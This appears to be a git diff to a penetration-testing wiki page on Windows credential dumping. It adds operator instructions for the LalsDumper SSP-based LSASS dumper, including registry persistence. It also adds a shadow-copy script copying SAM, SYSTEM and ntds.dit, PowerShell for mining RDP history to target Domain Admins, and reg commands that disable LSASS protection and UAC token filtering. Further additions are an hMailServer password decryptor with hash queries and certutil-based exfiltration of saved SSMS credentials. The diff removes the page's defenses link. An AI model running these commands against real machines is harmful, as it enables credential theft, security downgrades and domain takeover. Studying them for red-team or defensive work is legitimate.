@@ -126,6 +126,22 @@ Get-Process -Name LSASS
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
 
+## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump
+
+Ink Dragon ships a three-stage dumper dubbed **LalsDumper** that never calls `MiniDumpWriteDump`, so EDR hooks on that API never fire:
+
+1. **Stage 1 loader (`lals.exe`)** – searches `fdp.dll` for a placeholder consisting of 32 lower-case `d` characters, overwrites it with the absolute path to `rtu.txt`, saves the patched DLL as `nfdp.dll`, and calls `AddSecurityPackageA("nfdp","fdp")`. This forces **LSASS** to load the malicious DLL as a new Security Support Provider (SSP).
+2. **Stage 2 inside LSASS** – when LSASS loads `nfdp.dll`, the DLL reads `rtu.txt`, XORs each byte with `0x20`, and maps the decoded blob into memory before transferring execution.
+3. **Stage 3 dumper** – the mapped payload re-implements MiniDump logic using **direct syscalls** resolved from hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). A dedicated export named `Tom` opens `%TEMP%\<pid>.ddt`, streams a compressed LSASS dump into the file, and closes the handle so exfiltration can happen later.
+
+Operator notes:
+
+* Keep `lals.exe`, `fdp.dll`, `nfdp.dll`, and `rtu.txt` in the same directory. Stage 1 rewrites the hard-coded placeholder with the absolute path to `rtu.txt`, so splitting them breaks the chain.
+* Registration happens by appending `nfdp` to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. You can seed that value yourself to make LSASS reload the SSP every boot.
+* `%TEMP%\*.ddt` files are compressed dumps. Decompress locally, then feed them to Mimikatz/Volatility for credential extraction.
+* Running `lals.exe` requires admin/SeTcb rights so `AddSecurityPackageA` succeeds; once the call returns, LSASS transparently loads the rogue SSP and executes Stage 2.
+* Removing the DLL from disk does not evict it from LSASS. Either delete the registry entry and restart LSASS (reboot) or leave it for long-term persistence.
+
 ## CrackMapExec
 
 ### Dump SAM hashes
@@ -209,7 +225,9 @@ if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
 $id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
 $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
-$voume.Delete();if($notrunning -eq 1){$service.Stop()}
+cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
+cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
+$volume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
 
 Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
@@ -321,9 +339,108 @@ type outpwdump
 
 Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.
 
-## Defenses
+## Mining idle RDP sessions and weakening security controls
 
-[**Learn about some credentials protections here.**](credentials-protections.md)
+Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:
+
+### DumpRDPHistory-style telemetry collection
+
+* **Outbound RDP targets** – parse every user hive at `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Each subkey stores the server name, `UsernameHint`, and the last write timestamp. You can replicate FinalDraft’s logic with PowerShell:
+
+  ```powershell
+  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
+      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
+        ForEach-Object {
+            $server = Split-Path $_.Name -Leaf
+            $user = (Get-ItemProperty $_.Name).UsernameHint
+            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
+        }
+  }
+  ```
+
+* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21** (successful logon) and **25** (disconnect) to map who administered the box:
+
+  ```powershell
+  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
+    | Where-Object { $_.Id -in 21,25 } \
+    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
+  ```
+
+Once you know which Domain Admin regularly connects, dump LSASS (with LalsDumper/Mimikatz) while their **disconnected** session still exists. CredSSP + NTLM fallback leaves their verifier and tokens in LSASS, which can then be replayed over SMB/WinRM to grab `NTDS.dit` or stage persistence on domain controllers.
+
+### Registry downgrades targeted by FinalDraft
+
+The same implant also tampers with several registry keys to make credential theft easier:
+
+```cmd
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
+```
+
+* Setting `DisableRestrictedAdmin=1` forces full credential/ticket reuse during RDP, enabling pass-the-hash style pivots.
+* `LocalAccountTokenFilterPolicy=1` disables UAC token filtering so local admins get unrestricted tokens over the network.
+* `DSRMAdminLogonBehavior=2` lets the DSRM administrator log on while the DC is online, giving attackers another built-in high-privilege account.
+* `RunAsPPL=0` removes LSASS PPL protections, making memory access trivial for dumpers such as LalsDumper.
+
+## hMailServer database credentials (post-compromise)
+
+hMailServer stores its DB password in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` under `[Database] Password=`. The value is Blowfish-encrypted with the static key `THIS_KEY_IS_NOT_SECRET` and 4-byte word endianness swaps. Use the hex string from the INI with this Python snippet:
+
+```python
+from Crypto.Cipher import Blowfish
+import binascii
+
+def swap4(data):
+    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
+enc_hex = "HEX_FROM_HMAILSERVER_INI"
+enc = binascii.unhexlify(enc_hex)
+key = b"THIS_KEY_IS_NOT_SECRET"
+plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
+print(plain.decode())
+```
+
+With the clear-text password, copy the SQL CE database to avoid file locks, load the 32-bit provider, and upgrade if needed before querying hashes:
+
+```powershell
+Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
+Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
+$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
+$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
+$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
+$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
+```
+
+The `accountpassword` column uses the hMailServer hash format (hashcat mode `1421`). Cracking these values can provide reusable credentials for WinRM/SSH pivots.
+## LSA Logon Callback Interception (LsaApLogonUserEx2)
+
+Some tooling captures **plaintext logon passwords** by intercepting the LSA logon callback `LsaApLogonUserEx2`. The idea is to hook or wrap the authentication package callback so credentials are captured **during logon** (before hashing), then written to disk or returned to the operator. This is commonly implemented as a helper that injects into or registers with LSA, and then records each successful interactive/network logon event with the username, domain and password.
+
+Operational notes:
+- Requires local admin/SYSTEM to load the helper in the authentication path.
+- Captured credentials appear only when a logon occurs (interactive, RDP, service, or network logon depending on the hook).
+
+## SSMS Saved Connection Credentials (sqlstudio.bin)
+
+SQL Server Management Studio (SSMS) stores saved connection information in a per-user `sqlstudio.bin` file. Dedicated dumpers can parse the file and recover saved SQL credentials. In shells that only return command output, the file is often exfiltrated by encoding it as Base64 and printing it to stdout.
+
+```cmd
+certutil -encode sqlstudio.bin sqlstudio.b64
+type sqlstudio.b64
+```
+
+On the operator side, rebuild the file and run the dumper locally to recover credentials:
+
+```bash
+base64 -d sqlstudio.b64 > sqlstudio.bin
+```
+
+## References
+
+- [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
+- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
+- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 
 {{#include ../../banners/hacktricks-training.md}}
 
